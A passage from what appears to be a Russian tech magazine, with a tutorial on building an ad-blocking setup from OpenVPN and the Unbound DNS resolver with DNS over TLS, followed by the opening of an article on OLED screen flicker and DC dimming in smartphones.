блокировку всего лишнего — единожды и для всех подключенных устройств.


ПОДГОТОВИТЕЛЬНЫЙ ЭТАП
Предполагается, что у тебя уже есть сервер с пуб личным IP‐адресом, где
установлен Linux: в моем случае это был Ubuntu 16.10. Представленные при‐
меры будут работать и на других дистрибутивах Linux, с той раз ницей, что
нужно будет адаптировать установку пакетов под твой пакетный менеджер.


                          UbuntuЧто делать со ста рой вер сией
Так  получилось,  что мне  дос тался  сервер  с  устаревшими  ссылками
на репозитории, а сле довательно, при попытке обновиться я получал мно‐
жество ошибок.





                     Попытка обновиться

Google ненавязчиво подсказал мне, что репози тории были переме щены
на поддомен old‐releases. Исправляем и обновля емся:


 $ sed ‐i 's|us.archive|old‐releases|' /etc/apt/sources.list
 $ sed ‐i 's|//security|//old‐releases|' /etc/apt/sources.list
 $ apt update && apt upgrade ‐y && reboot





Установка OpenVPN
Есть два пути:
 • простой — с исполь зованием уже готового обра за Docker (для тех, кто
   не хочет заморачиваться и вникать в конфиги OpenVPN);
 • сложный — с ручной уста новкой и конфигури рова нием OpenVPN.

Мы рассмотрим оба варианта и начнем с прос того.


Docker-образ с OpenVPN
Скачиваем образ.


$ docker pull kylemanna/openvpn

На гитхабе автора лежит достаточно полная документация в виде файла
README. Им мы и восполь зуемся. Для начала нам нужно соз дать файл кон‐
фигурации для сервера VPN.


$ docker run ‐v /etc/openvpn:/etc/openvpn ‐‐log‐driver=none ‐‐rm ‐it
kylemanna/openvpn ovpn_genconfig ‐u udp://192.168.0.183

Указываем тут протокол, в который будет оборачиваться трафик, и белый IP
твоего сервера. Давай посмотрим на полученный конфиг.


$ cat /etc/openvpn/openvpn.conf


server 192.168.255.0 255.255.255.0
verb 3
key /etc/openvpn/pki/private/192.168.0.183.key
ca /etc/openvpn/pki/ca.crt
cert /etc/openvpn/pki/issued/192.168.0.183.crt
dh /etc/openvpn/pki/dh.pem
tls‐auth /etc/openvpn/pki/ta.key
key‐direction 0
keepalive 10 60
persist‐key
persist‐tun


proto udp
# Rely on Docker to do port mapping, internally always 1194
port 1194
dev tun0
status /tmp/openvpn‐status.log


user nobody
group nogroup
comp‐lzo no


### Route Configurations Below
route 192.168.254.0 255.255.255.0


### Push Configurations Below
push "block‐outside‐dns"
push "dhcp‐option DNS 8.8.8.8"
push "dhcp‐option DNS 8.8.4.4"
push "comp‐lzo no"

Если необходимо сменить порт, то меня ем его в этом файле, а также в
/etc/openvpn/ovpn_env.sh.  Переходим   к   генерации  сертификатов
для удостоверяющего центра.


$ docker run ‐v /etc/openvpn:/etc/openvpn ‐‐log‐driver=none ‐‐rm ‐it
kylemanna/openvpn ovpn_initpki

Будет запрошен пароль для соз дания ключа удос товеря юще го центра.





Теперь генерируется сертификат и ключ сервера, клю чи протокола Диффи —
Хел лмана, а также подпись HMAC для проверки целос тности TLS.





После этого мы дол жны добавить пользователей. Делается это так же прос то.


$ docker run ‐v /etc/openvpn:/etc/openvpn ‐‐log‐driver=none ‐‐rm ‐it
kylemanna/openvpn easyrsa build‐client‐full CLIENTNAME nopass

В качестве CLIENTNAME я буду использовать имя хоста клиента (поз же ты
узнаешь, для чего это нужно). Соз даем сертификат для пользователя user‐
pc, нас сразу же попросят указать пароль от сертификата удос товеря ющего
центра. Сертификат готов, но нам‐то нуж но получить файл конфигурации
для OpenVPN. Выпол няем следующую команду.


$ docker run ‐v /etc/openvpn:/etc/openvpn ‐‐log‐driver=none ‐‐rm ‐it
kylemanna/openvpn ovpn_getclient user‐pc > /root/user‐pc.ovpn

Смотрим на результат.


$ cat /root/user‐pc.ovpn


client
nobind
dev tun
remote‐cert‐tls server


remote 192.168.0.183 1194 udp


<key>
‐‐‐‐‐BEGIN PRIVATE KEY‐‐‐‐‐
...
‐‐‐‐‐END PRIVATE KEY‐‐‐‐‐
</key>
<cert>
‐‐‐‐‐BEGIN CERTIFICATE‐‐‐‐‐
...
‐‐‐‐‐END CERTIFICATE‐‐‐‐‐
</cert>
<ca>
‐‐‐‐‐BEGIN CERTIFICATE‐‐‐‐‐
...
‐‐‐‐‐END CERTIFICATE‐‐‐‐‐
</ca>
key‐direction 1
<tls‐auth>
#
# 2048 bit OpenVPN static key
#
‐‐‐‐‐BEGIN OpenVPN Static key V1‐‐‐‐‐
...
‐‐‐‐‐END OpenVPN Static key V1‐‐‐‐‐
</tls‐auth>


redirect‐gateway def1

Ключи в формате Base64 намеренно убра ны из вывода, чтобы уменьшить его
содержимое. На этом все: запус каем OpenVPN в режиме демона.


$ docker run ‐v /etc/openvpn:/etc/openvpn ‐d ‐p 1194:1194/udp
‐‐cap‐add=NET_ADMIN kylemanna/openvpn

На стороне клиента про буем подключиться.


$ sudo openvpn ‐‐config user‐pc.ovpn

Если все прошло успешно, то в конце лога ты увидишь надпись Initializa‐
tion Sequence Completed, а в списке интерфей сов появится tun0 с IP‐
адресом из подсети 192.168.255.0/24. Для наших целей этого впол не хватит,
нужно  только добавить команду на  запуск контейнера  в  автозагрузку
и переходить к части с настройкой DNS.


Руч ная настройка OpenVPN
Второй вариант — это настроить OpenVPN полностью вручную. Поехали
по шагам.

1. Устанав ливаем OpenVPN.


$ sudo apt install ‐y openvpn

2. Скачиваем easy‐rsa.


$ sudo git clone https://github.com/OpenVPN/easy‐rsa.git /etc/
openvpn/easy‐rsa

3. Выставляем переменные для easy‐rsa в файле /etc/openvpn/easy‐rsa/
easyrsa3/vars, остальное по желанию. Файл /etc/openvpn/easy‐rsa/
easyrsa3/vars.example содер жит полный перечень доступных переменных,
но нам хватит и этого.


set_var EASYRSA_KEY_SIZE    2048
set_var EASYRSA_CA_EXPIRE   3650
set_var EASYRSA_CERT_EXPIRE 3650

4. Инициализация PKI.


$ cd /etc/openvpn/easy‐rsa/easyrsa3 && ./easyrsa init‐pki

5. Создание центра сертифика ции. Указываем пароль и Common Name.


$ ./easyrsa build‐ca

6. Создание ключей сервера. Везде используем имя хоста как Common Name
для создания сертификата.


$ ./easyrsa build‐server‐full vpnserver nopass

7. Создание ключей клиента.


$ ./easyrsa build‐client‐full user‐pc nopass

8. По желанию: если нуж но сгенерировать ключи Диффи — Хеллмана и TLS.


$ ./easyrsa gen‐dh
$ openvpn ‐‐genkey ‐‐secret /etc/openvpn/easy‐rsa/easyrsa3/pki/ta.key

На этом создание сертификатов завершено, переходим к написанию конфига
для VPN‐сервера /etc/openvpn/server.conf:


# Адрес твоего сервера
local 192.168.0.183


# Какой TCP/UDP‐порт должен слушать OpenVPN
port 3333


# Режим работы
mode server


# Используемый протокол TCP/UDP
proto udp


# Тип интерфейса, tun (OSI Layer 3) или tap (OSI Layer 2)
dev tun


# Пути к файлам сертификатов
ca /etc/openvpn/easy‐rsa/easyrsa3/pki/ca.crt
cert /etc/openvpn/easy‐rsa/easyrsa3/pki/issued/vpnserver.crt


# Этот файл необходимо хранить в секрете
key /etc/openvpn/easy‐rsa/easyrsa3/pki/private/vpnserver.key
dh /etc/openvpn/easy‐rsa/easyrsa3/pki/dh.pem


# Указываем адрес сервера и подсеть
server 10.8.0.0 255.255.255.0


# Выдаем пользователям необходимые маршруты
push "route 10.8.0.0 255.255.255.0"


# OpenVPN as Proxy. Перенаправляем трафик клиентов в интернет
push "redirect‐gateway def1 bypass‐dhcp"


# Используем свой собственный DNS‐сервер
push "dhcp‐option DNS 10.8.0.1"


# Разрешаем подключенным клиентам OpenVPN‐сервера соединяться друг с
другом
client‐to‐client


# Используем сжатие трафика (если не нужно, то можно
закомментировать!)
comp‐lzo


# Проверяем состояние клиента, отправляем пакеты каждые 10 с, если в
течение 120 с клиент не ответил, то он считается отключенным
keepalive 10 120


# Используем те же ключи и интерфейсы при рестарте
persist‐key
persist‐tun


# Лог‐файл
log openvpn.log


# Уровень логирования 0 — в лог попадают только записи о критических
ошибках сервера, если нужно подробнее, то выставляем 9 для дебагинга
verb 0
# Количество записей, после которых будет производиться запись в лог
mute 20

Плюс установки OpenVPN из репозитория еще и в том, что дополнительно он
прописывается как сервис в systemctl. Подпра вим его для работы с нашим
конфигом.


$ systemctl cat openvpn.service


# /lib/systemd/system/openvpn.service
# This service is actually a systemd target,
# but we are using a service since targets cannot be reloaded.


[Unit]
Description=OpenVPN service
After=network.target


[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/bin/true
ExecReload=/bin/true
WorkingDirectory=/etc/openvpn


[Install]
WantedBy=multi‐user.target

Получив путь к файлу, немного изменим его под наши нужды.


# /lib/systemd/system/openvpn.service
# This service is actually a systemd target,
# but we are using a service since targets cannot be reloaded.


[Unit]
Description=OpenVPN service
After=network.target


[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/usr/sbin/openvpn ‐‐config server.conf ‐‐daemon
ExecReload=/usr/sbin/openvpn ‐‐config server.conf ‐‐daemon
WorkingDirectory=/etc/openvpn
RestartSec=5s
Restart=on‐failure


[Install]
WantedBy=multi‐user.target

Запускаем сервис.


$ sudo systemctl enable openvpn.service && sudo systemctl start
openvpn.service

И проверяем на ошибки.


$ journalctl ‐uxe openvpn.service

В прошлом примере с Docker у нас была воз можность получить конфиг кли‐
ента одной командой. Пора написать для этого скрипт.


#!/bin/bash


USERNAME=$1
EASYRSA_PKI="/etc/openvpn/easy‐rsa/easyrsa3/pki"


echo "
client
nobind
dev tun
remote 192.168.0.183 3333
proto udp
comp‐lzo yes
auth‐nocache
script‐security 2
persist‐key
persist‐tun"


echo "<key>
$(cat ${EASYRSA_PKI}/private/${USERNAME}.key)
</key>


<cert>
$(openssl x509 ‐in ${EASYRSA_PKI}/issued/${USERNAME}.crt)
</cert>


<ca>
$(cat $EASYRSA_PKI/ca.crt)
</ca>
"

Описывать его не вижу необ ходимости: тут все то же самое, а за подробнос‐
тями можешь заглянуть в man openvpn.
   Теперь, когда у нас готов сервер VPN и нас троено подключение клиентов,
пора приступать к конфигура ции сервера DNS.


UNBOUND
Выбор на него пал по нескольким причинам:
 • есть поддержка DNSSEC;
 • умеет кешировать;
 • можно настроить DoT (DNS over TLS);
 • очень прост в конфигурировании;
 • большая скорость работы и малый раз мер по сравнению с BIND.



                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
       ПРОГРАММЫ
       БЕЗ РЕКЛАМЫ
                   ИСПОЛЬЗУЕМ VPN И UNBOUND,
           ЧТОБЫ УБРАТЬ БАННЕРЫ ИЗ ПРИЛОЖЕНИЙ





Компиляция Unbound DNS Resolver
Скачиваем с GitHub последнюю версию Unbound, устанавливаем зависимос‐
ти.


$ git clone https://github.com/NLnetLabs/unbound.git /opt/unbound
$ sudo apt install ‐y protobuf‐c‐compiler libevent‐dev libssl‐dev
libsodium‐dev libfstrm‐dev

Теперь можно приступать к компиляции.


$ cd /opt/unbound
$ ./configure \
        ‐‐prefix=/usr \
        ‐‐sysconfdir=/etc \
        ‐‐localstatedir=/var \
        ‐‐sbindir=/usr/bin \
        ‐‐disable‐rpath \
        ‐‐enable‐dnscrypt \
        ‐‐enable‐dnstap \
        ‐‐enable‐pie \
        ‐‐enable‐relro‐now \
        ‐‐enable‐subnet \
        ‐‐enable‐tfo‐client \
        ‐‐enable‐tfo‐server \
        ‐‐with‐conf‐file=/etc/unbound/unbound.conf \
        ‐‐with‐pidfile=/run/unbound.pid \
        ‐‐with‐rootkey‐file=/etc/trusted‐key.key \
        ‐‐with‐libevent
$ make
$ sudo make install

Здесь:
 • withconffile — ука зываем стандартный путь к файлу конфигура‐
   ции;
 • enablednscrypt — вклю чаем поддержку DNSSEC;
 • withrootkeyfile — путь к файлу с доверен ными ключами;
 • enablednstap — вклю чаем поддержку dnstap.

После успешной сборки нам осталось добавить пару нюансов. Во‐первых,
создать пользователя.


$ sudo useradd ‐s /bin/false ‐d /etc/unbound unbound

Во‐вторых, добавить сервис /lib/systemd/system/unbound.service. Его
содержимое будет таким.


# /lib/systemd/system/unbound.service
[Unit]
Description=Unbound DNS Resolver
Wants=nss‐lookup.target
Before=network‐online.target nss‐lookup.target
After=network.target


[Service]
ExecStart=/usr/bin/unbound
ExecReload=/bin/kill ‐HUP $MAINPID
Restart=always


[Install]
WantedBy=multi‐user.target

Добавим якорь в tmpfiles.d.


$ echo 'C /etc/unbound/trusted‐key.key ‐ ‐ ‐ ‐ /etc/trusted‐key.key'
> /usr/lib/tmpfiles.d/unbound.conf


Кон фигурация DNS over TLS
DoT добавит нам больше конфиденциальнос ти и позволит защититься от спу‐
финга. Ниже пример файла конфигурации /etc/unbound/unbound.conf.


server:
  # Слушаем все интерфейсы
  interface: 0.0.0.0
  interface: ::0
  # Логи пишем в системный журнал
  use‐syslog: yes
  do‐daemonize: no
  username: "unbound"
  # Количество потоков. Рекомендуется ставить максимальное для твоей
системы
  num‐threads: 2
  verbosity: 2


  # Запрещаем входящие запросы из интернета
  access‐control: 0.0.0.0/0 refuse
  access‐control: ::0/0 refuse


  # Разрешаем запросы с локального хоста и подсетей VPN
  access‐control: 127.0.0.1 allow
  access‐control: ::1 allow
  access‐control: 10.8.0.0/24 allow


  # Скрываем отображение версии сервера
  hide‐identity: yes
  hide‐version: yes


  # Указываем приватные сети, к которым будет доступ у клиентов
  private‐address: 127.0.0.1
  private‐address: ::1
  # Сеть VPN
  private‐address: 10.8.0.0/24
  private‐address: fe80::/24


  # Директория с файлами конфигурации
  directory: "/etc/unbound"
  # Файлы ключей и сертификатов для DNS over TLS
  trust‐anchor‐file: trusted‐key.key
  tls‐cert‐bundle: /etc/ssl/certs/ca‐certificates.crt
  # Минимальное и максимальное время кеша
  cache‐max‐ttl: 86400
  cache‐min‐ttl: 3600
  # Подгружаем локальные конфиги из local.d, туда будем добавлять
потом фильтры рекламы
  include: /etc/unbound/local.d/*.conf


# Ну и самая главная часть: перенаправляем все DNS‐запросы на
серверы с поддержкой DoT
forward‐zone:
  name: "."
  forward‐tls‐upstream: yes
  ## Cloudflare DNS
  forward‐addr: "1.1.1.1@853#cloudflare‐dns.com"
  forward‐addr: "1.0.0.1@853#cloudflare‐dns.com"
  ## IPv6  Cloudflare DNS over TLS
  forward‐addr: "2606:4700:4700::1111@853#cloudflare‐dns.com"
  forward‐addr: "2606:4700:4700::1001@853#cloudflare‐dns.com"


# Эта опция нам понадобится для обновления конфигурации Unbound в
режиме реального времени
remote‐control:
  control‐enable: yes
  # Разрешаем запросы только из локальной сети
  control‐interface: 127.0.0.1
  control‐interface: ::1
  control‐port: 8953
  # При желании можно добавить проверку сертификата
  control‐use‐cert: no

Конфиг  готов! Создадим файл клю чей /etc/unbound/trusted‐key.key
для DNSSEC.


$ sudo unbound‐anchor ‐a /etc/unbound/trusted‐key.key


Со юз с NetworkManager
Для обновления файла /etc/resolv.conf нам потребу ется утилита openre‐
solv. Создадим для нее кон фиг /etc/resolvconf.conf.


resolv_conf=/etc/resolv.conf
name_servers="::1 127.0.0.1"

Тут мы указываем путь к resolv.conf и адрес DNS по умол чанию для всей
системы. Командой $ resolvconf ‐u обновляем resolv.conf, чтобы в него
добавились изменения. Если ты подключаешься к интерне ту при помощи
NetworkManager, то для того, чтобы он тоже использовал openresolv, нужно
поправить файл /etc/NetworkManager/conf.d/rc‐manager.conf:


[main]
rc‐manager=resolvconf


Запуск Unbound
Запускаем резолвер командой


$ sudo systemctl start unbound

После этого все дол жно работать.


           WARNING

                    Важно убедиться, что перед запуском Unbound
                         у   тебя   отключены   другие   DNS‐серверы
                      или резолверы! Возможные ошибки и их причину
                    можешь  узнать, написав journalctl  ‐xeu
                   unbound.



БЛОКИРОВКА РЕКЛАМЫ
Переходим к самой важной час ти всего нашего процесса. Поискав информа‐
цию в Сети и посмотрев филь тры uBlock, который установлен в моем браузе‐
ре, я нашел несколь ко списков с доменами:
 • список yoyo;
 • список доменов malwaredomainlist.

Создаем скрипт /etc/unbound/local.d/update_ads_filters.py, который
будет это все парсить и генерировать пра вила для нашего Unbound.


#!/usr/bin/python
import requests


response = requests.get('https://pgl.yoyo.org/adservers/serverlist.
php?hostformat=unbound&showintro=0&mimetype=plaintext')
hosts = requests.get('http://www.malwaredomainlist.com/hostslist/
hosts.txt')


def make_unbound_zone(host):
    fmt = 'local‐zone: "{0}" redirect\nlocal‐data: "{0} A 127.0.0.1"\
n'
    return fmt.format(host)


if response and response.status_code == 200:
    unbound_format = response.text
    if hosts and hosts.status_code == 200:
        for line in hosts.text.splitlines():
            if not line or line.startswith('#'):
                continue
            _, host = line.strip().split()
            if host not in unbound_format:
                unbound_format += make_unbound_zone(host)


print(unbound_format)

Тут все очень просто: для каждого домена соз дается следующая запись.


local‐zone: "HOSTNAME" redirect
local‐data: "HOSTNAME A 127.0.0.1"

Как потом выяснилось, можно вмес то редиректа на 127.0.0.1 использовать
более простую запись и воз вра щать NXDOMAIN. Если коротко, то это означает,
что запрашиваемый домен не существует.


local‐zone: "HOSTNAME" always_nxdomain

Добавляем этот скрипт в crontab с периодом запус ка не чаще одного раза
в неделю (не думаю, что домены будут обновлять ся чаще) и запус каем.


# /etc/unbound/local.d/update_ads_filters.py > /etc/unbound/local.d/
adservers.conf && unbound‐control reload

Дополнительно создадим еще один скрипт /etc/unbound/insert_filter_‐
domain.sh, который позволит вручную блокировать необходимые домены. Я
с его помощью добавил Яндекс.Мет рику.


#!/bin/bash
DOMAIN=$1


FILTER_FILE="/etc/unbound/local.d/ruads.conf"


echo "local‐zone: \"${DOMAIN}\" always_nxdomain" >> ${FILTER_FILE}


unbound‐control reload


ДОБАВЛЯЕМ РЕЗОЛВИНГ DNS ДЛЯ КЛИЕНТОВ
Все может работать и без это го, но приятно будет вместо обращения по IP
использовать короткий адрес, который легко запомнить. Есть и еще одна
причина: все клиенты при подключении получа ют IP‐адреса от встроенного
в OpenVPN сервера DHCP и каждый раз эти адреса могут меняться.
   Это можно было бы решить, прописав все IP статически, или вместо
интерфейса TUN для OpenVPN исполь зовать TAN и раз вернуть сверху собс‐
твенный сервер DHCP, но это не наш путь. Мы вос пользуемся тем, что у нас
есть, а заодно и узнаем некото рые осо бенности OpenVPN.
  Для начала нам нужно обновить конфиг OpenVPN (файл /etc/openvpn/
server.conf), добавив туда следующие строки:


# Разрешаем скриптам запуск сторонних приложений
script‐security 2
# Назначаем скрипт, который будет запускаться при подключении и
отключении клиента
client‐connect /etc/openvpn/connect.sh
client‐disconnect /etc/openvpn/connect.sh

Сам скрипт /etc/openvpn/connect.sh выглядит так.


#!/bin/bash


add_to_unbound() {
    host="$1"
    ip="$2"


    reverse_ip=$(echo $ip | awk ' BEGIN { FS="." ; OFS="." } { print
$4,$3,$2,$1 }')
    unbound‐control local_data "${host} IN A $ip"
    unbound‐control local_data "${reverse_ip}.in‐addr.arpa. IN PTR ${
host}"
}


del_from_unbound() {
    host="$1"
    ip="$2"


    reverse_ip=$(echo $ip | awk ' BEGIN { FS="." ; OFS="." } { print
$4,$3,$2,$1 }')
    unbound‐control local_data_remove "${host}"
    unbound‐control local_data_remove "${reverse_ip}.in‐addr.arpa."
}


if [ "$script_type" == "client‐connect" ]; then
    add_to_unbound "${common_name}" "${ifconfig_pool_remote_ip}"
elif [ "$script_type" == "client‐disconnect" ]; then
    del_from_unbound "${common_name}" "${ifconfig_pool_remote_ip}"
fi

Из мануала по OpenVPN можно узнать, что для запускаемых им скриптов
и команд доступны некото рые гло бальные переменные:
 • script_type — событие, вызвавшее запуск скрипта, дос тупны варианты
  up , down, ipchange, routeup, tlsverify, authuserpassveri
  fy , clientconnect, clientdisconnect и learnaddress;
 • common_name — поле Common Name из сертификата клиента. Помни, что
   при генерации сертификатов мы ука зывали там имя хоста;
 • ifconfig_pool_remote_ip — внут ренний IP клиента.

Функции add_to_unbound() и del_from_unbound(), используя интерфейс
удаленного управления конфигурацией Unbound, добавляют записи, которые
резолвят имена хостов клиентов.
  Дополнительно создадим файл /etc/unbound/local.d/localzone.conf,
который будет содержать записи для резол ва имени текущего сервера и всей
подсети в целом.


insecure‐lan‐zones: yes


local‐zone: "10.in‐addr.arpa." nodefault
local‐zone: "8.10.in‐addr.arpa." nodefault


local‐data‐ptr: "10.8.0.1 vpnserver"
local‐data: "vpnserver A 10.8.0.1"


ИТОГ
На этом настройка нашей системы фильтрации закончена. Устанавливаем
на телефон OpenVPN, подключаемся и проверяем. Вот как результаты выг‐
лядят в браузере.





                      Результаты до и пос ле

В приложении MiFit.





И Avito.





Идеально!
ТРЮКИ
     БЕРЕГИ
       ГЛАЗА!

                        АКТИВИРУЕМ
                      DC DIMMING
                       В IPHONE XS,
                                 PIXEL 3 XL,
                               XIAOMI MI 9
                        И ДРУГИХ
                      СМАРТФОНАХ





                                                                           Олег Афонин
                                                                                   Эксперт по мобильной
                                                                                 криминалистике компании
                                                                                     «Элкомсофт»
                                                                                          aoleg@voicecallcentral.com





«Вырвиглазные  мерцающие   OLED‐дисплеи   остались
в прошлом! Берегите гла за: в Xiaomi изобрели способ сде‐
лать OLED без мерцания! Спешите видеть: новая воз‐
можность доступна не только для актуального флаг мана,
но и для старых устройств!» Сколько в этих утверждениях
истины, а сколько — рекламной шелухи, что на самом деле
сделали в Xiaomi и были ли они первыми на рын ке? Попробу‐
ем разобраться.


О ВРЕДЕ МЕРЦАНИЯ
Споры о вреде мерцания не стихают с тех самых пор, как дисплеи стали мер‐
цать. «Через пять минут глаза слезятся, через полчаса краснеют!» — жалу‐
ется пользователь на форуме. «У меня тоже есть нога, но она не болит!» —
хором отвечают ему форумчане. «На AMOLED цвета, конечно, сочнее, но зато
от IPS глаза не болят», — делятся наблюдением дру гие пользователи и дела‐
ют неожиданный вывод: «Наверное, дело в цветопередаче!»
   Увы, нет: дело не в цветопередаче, точнее — не только в ней. Дело в том,
что современные экраны OLED, используемые в смартфонах, мерцают
на достаточно низкой частоте в 240 Гц. По ста тистике, мерцания на этой час‐
тоте не замечает 70% пользователей, а из тех, кто замечает, большинс тво
не обращает внимания. В то же время нагрузка на глаз одинакова у всех;
будут ли болеть глаза у конкрет ного пользователя, который смотрит на мер‐
цающий экран, зависит не от того, видит ли он мерцание (это физиологичес‐
кое свойство не глаз, а мозга, обра батывающего поступающую от глазного
нерва картинку), а от здоровья глаз пользователя и, так сказать, оставшегося
«запаса прочности» по зрению.
  Я отношусь к категории пользователей, которые мерцание отлично видят
и замечают. Лично мне мерцание меша ет, а глаза от него устают. Наверное, я
был единственным в своем городе человеком, который в 1995 году менял
видеокарту в компьютере только для того, чтобы получить DAC, поз воляющий
на разрешении 800 × 600 достичь час тоты обновления на ЭЛТ‐мониторе
не в 56, а в 75 Гц.
  С мерцанием OLED‐экранов я впервые столкнулся в 2014 году в смартфо‐
нах Nexus 6 и Nokia Lumia 930. И если с мерцанием смартфона с Windows мне
пришлось смириться, то ядро Nexus 6 я успешно модифицировал, полностью
избавившись от мерцания. «А что, так мож но было?» Да — если ты понима‐
ешь, чем жертвуешь, и согласен терпеть «поехавшую» цветопе редачу на низ‐
ких уровнях яркости и мириться с неравномерными заливками в тенях. В этой
статье я планирую расска зать о том, как избавить ся от мерцания в смартфо‐
нах Xiaomi Mi 9, Google Pixel 3 XL и iPhone X, Xs и Xs Max. В качестве бонуса я
посоветую, как убрать мерцание на смартфонах Samsung Galaxy S8, S9 и S10.
Наконец, я поделюсь информа цией о том, как изба виться от PWM практичес‐
ки на любом смартфоне с Android как с root‐доступом, так и без него.


XIAOMI — НОВАТОРЫ ИЛИ НЕТ?
Xiaomi была не первой компанией, которая решила избавиться от мерцания
OLED‐панелей. Задол го до Xiaomi OLED‐панели без мерцания использовала
компания LG в своих экспериментальных смартфонах. Самым ярким предста‐
вителем таких устрой ств был LG G Flex 2, весьма противоречивый смартфон
с изогнутым экраном P‐OLED. В этом смартфо не LG допус тила столько оши‐
бок, что их перечисление рас тянулось бы на несколько абзацев. Мы же рас‐
смотрим только и исключитель но экран.
  В LG G Flex 2 исполь зовалась гибкая матрица P‐OLED, управле ние яркости
в которой на аппаратном уровне было реализовано через изме нение подава‐
емого на пиксели тока. Контроллер экра на не был оборудован модулем ШИМ
(широтно‐импульсная модуляция, или pulse width modulation, PWM); соответс‐
твенно, никакого мерцания не было даже на самом низком уровне яркости.
   Пользователи очень пло хо вос приняли этот дис плей, и их можно понять:
на низкой яркости изоб ражение покрывалось желтыми разводами и приобре‐
тало структуру «наждачной бумаги». Тех нология про изводства эксперимен‐
тальных экранов в 2015 году была пло хо отработана, и довольно большому
числу пользователей не повезло получить смартфо ны с ярко выраженными
дефектами P‐OLED.





В то же время в LG никак не использовали отсутс твие мерцания в своих мар‐
кетинговых  программах:  не  публикова лись  статьи о  вреде мерцания,
не выходили технические публикации, подобные тем, что делает Google
в своем блоге. С учетом того что в 2015 году проблема мерцания экранов
была неизвестна широкому кругу поль зователей, а два человека из трех
не способны заметить мерцание светодиодов на частоте 240 Гц, экспе‐
римент LG провалился. Технологию немерцающих экранов OLED крупные
производители положили под сукно.


             INFO

                    А знаешь ли ты, что львиная доля OLED‐панелей
                       для телевизоров многих известных производите‐
                       лей — от SONY и Philips до самой LG включитель‐
                      но — выпускается на заводах LG? Все эти панели
                       используют струк туру пик селей RGBW и не мер‐
                     цают ни на каком уровне яркости — в отличие
                         от  подавляющего  большинства  LCD‐экранов
                       для телевизоров. Забавный парадокс, правда?


Действительно ли OLED без мерцания нас только плохи? В 2015 году тех‐
нология производства действитель но допускала гигантский по современным
меркам уро вень разброса параметров между соседними светодиодами.
Сильнее все го разброс параметров проявлялся тогда, когда на светодиод
подавался очень низкий ток. А вот при высоком токе разница между харак‐
теристиками соседних пикселей в глаза не бросалась. Этот эффект можно
сравнить с цифровым шумом на фотографиях, сделанных в темноте с корот‐
кой выдержкой. Чем мень ше фотонов попадает на светочувствительные ячей‐
ки (а для экрана — чем мень ше фотонов излучается светодиодом), тем боль‐
ше вероятность возникновения «цифрового шума».
  При цифровой фотосъ емке для уменьшения шума можно использовать
более длинную выдержку. В случае же с излучающим светодиодом можно
увеличить ток, заставив светодиод светиться ярче, испуская значительно
большее количество фотонов. Логичным решением стало использование
схемы управления яркостью на основе широтно‐импульсной модуля ции.
   Крупнейшим  производителем  OLED‐панелей  для  смартфонов  была
и остается компания Samsung. Samsung исполь зует AMOLED в собственных
смартфонах и поставляет панели сотням производителей, включая Apple
и Google (о Google — чуть ниже, там не все так просто). В зависимости
от требований конкретного OEM раз личаются нас тройки панелей, включая
и настройки ШИМ. Эти различия проявляются в том, на каком именно уровне
яркости (в процентах от максимальной) заканчивается пря мое управление
яркостью и начинается скваж ность импульсов, приводящая к мерцанию.





   Примерно так работает управление яркостью на уровне контрол лера

Так, панели Samsung в смартфо нах Galaxy S8+ мерцают всегда, даже
на яркости в 99% от максимальной. Убедиться в этом можно на следующем
изображении.





  В Samsung Galaxy S8+ зна чимая модуляция дисплея присутствует даже
  при яркости в 75% от максимума (источник: ixbt.com)

Использование ШИМ на протяжении всего диапазона значений яркости поз‐
волило Samsung добиться отличной цветопереда чи и равномерных заливок
даже на самых темных участках экра на. То, что заявленных характеристик
достигают, бомбардируя глаза пользователя нечас тыми яркими вспышками
света, компания дол гое время игнорировала. Даже в актуальном поколении
Galaxy S10 производитель использует все ту же схему управления яркостью.
  Со стороны Samsung это вполне соз нательный подход, как можно убе‐
диться, изучив патентную заявку US9269294B2.
   Практически все другие производители исполь зуют гибридный подход
к управлению яркостью. На высоких уровнях яркости контроллер дисплея
варьирует ток, подаваемый на светодиоды. Ког да яркость падает до задан‐
ного производителем уровня, контроллер перестает снижать ток и начинает
использовать ШИМ. В разных моделях будут использованы раз ные уровни
отсечки, которые могут зависеть как от характеристик матрицы, так и от
пожелания OEM. Так, на момент выхода экран Xiaomi Mi 9 мерцал точно так
же, как мерцают экраны в телефонах Samsung. Apple нас троила экраны
iPhone X, Xs и Xs Max таким образом, что мерцание ШИМ начинается на уров‐
не яркости 50% и ниже.





  На уровнях яркости 50% и выше колебания яркости можно игнорировать:
  их амплитуда невелика, и светодиод никогда не гас нет полностью.
  Видимого мерцания на этих час тотах нет (источник: ixbt.com)


МОЖНО ЛИ ОБОЙТИСЬ БЕЗ МЕРЦАНИЯ?
Можно ли уменьшить видимое мерцание,  увеличив  частоту  пульсаций
до уровня, когда даже самые критически настроенные пользователи не смо‐
гут  увидеть  ШИМ?  Можно  запросто,   таких  экранов  множес тво.
Еще в 2015 году Microsoft уста навливала OLED‐экраны с час тотой мер‐
цания 500 Гц в смартфон Lumia 950 (при этом в старшую модель 950 XL ста‐
вили обычные экраны с ШИМ на частоте 240 Гц). Практически все современ‐
ные LCD‐телевизоры мерцают на частоте 240 Гц, но в SONY не поленились
установить во всех моделях контроллеры управления яркостью либо совсем
без мерцания, либо с мерцанием на час тоте 720 Гц (заметить его действи‐
тельно очень трудно).
  Почему так не делают? Эко номия: контроллер, работающий на более
высокой частоте, стоит на нес колько десят ков центов (для смартфонов)
или даже долларов (для телевизоров) дороже самых дешевых, с мерцанием
на низкой частоте. Это ты ценишь свои глаза дороже пары долларов, у про‐
изводителя же — экономика масшта бов: даже несколько десятков центов,
масштабирован ных на миллионы устройств, поз волят положить в карман
лишние сотни тысяч, а то и миллионы долларов. При этом, если завтра
в какой‐нибудь юрисдикции законодательно зафиксируют санитарные нормы
для смартфонов, в которых будет огра ничиваться пуль сация экрана, произво‐
дители отреагируют на следующий же день, начав устанавливать панели
с соответствующими настройками.
  А можно ли вооб ще изба виться от мерцания, полностью переведя панели
на прямое управление яркостью? Сегодня и это проделать можно, а вот
еще два‐три года назад тебе пришлось бы терпеть слишком много компро‐
миссов. Я до сих пор помню смартфон Lumia 930, OLED‐экран которого
на минимальной яркости становился нежно‐розового цвета — и это несмотря
на мерцание.
  Сегодня же телевизоры с OLED‐экра нами не мерцают вообще. Если тебя
не убеждают компьютерные монито ры, уже много лет работающие без мер‐
цания, то свежий пример — компания SONY, реализующая именно такую схе‐
